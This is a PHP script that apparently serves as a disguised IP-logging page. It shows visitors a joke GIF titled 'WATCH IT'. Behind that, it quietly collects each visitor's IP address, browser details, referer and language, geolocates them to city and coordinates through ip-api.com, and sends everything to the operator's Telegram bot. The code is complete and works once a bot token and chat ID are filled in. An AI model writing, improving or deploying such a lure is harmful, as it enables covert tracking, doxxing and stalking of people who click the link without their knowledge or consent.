<?php
// /web/TELEGRAM/rayzer.php

$BOT_TOKEN = "PUT_BOT_TOKEN_HERE";
$CHAT_ID = "PUT_CHAT_ID_HERE";
$GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";

$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
}
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? "None";
$referer = $_SERVER['HTTP_REFERER'] ?? "None";
$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? "None";

$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country,regionName,city,lat,lon,isp,org,query"), true);

$message = "🔍 *New Log (PHP)*\n\n";
$message .= "*IP:* `$ip`\n";
$message .= "*Location:* " . ($geo['city'] ?? "?") . ", " . ($geo['regionName'] ?? "?") . ", " . ($geo['country'] ?? "?") . "\n";
$message .= "*Cords:* " . ($geo['lat'] ?? "?") . ", " . ($geo['lon'] ?? "?") . "\n";
$message .= "*ISP:* " . ($geo['isp'] ?? "Unknown") . "\n";
$message .= "*User-Agent:* `$userAgent`\n";
$message .= "*Referer:* $referer\n";
$message .= "*Language:* $lang\n\n";
$message .= "📅 " . date("Y-m-d H:i:s UTC");

$url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";
$data = [
    'chat_id' => $CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header' => "Content-type: application/json\r\n",
        'method' => 'POST',
        'content' => json_encode($data),
    ],
];
$context = stream_context_create($options);
@file_get_contents($url, false, $context);

?>
<!DOCTYPE html>
<html>

<head>
    <title>WATCH IT</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin:0;background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
    <img src="<?php echo $GIF_URL; ?>" style="max-width:100%;height:auto;" />
</body>

</html>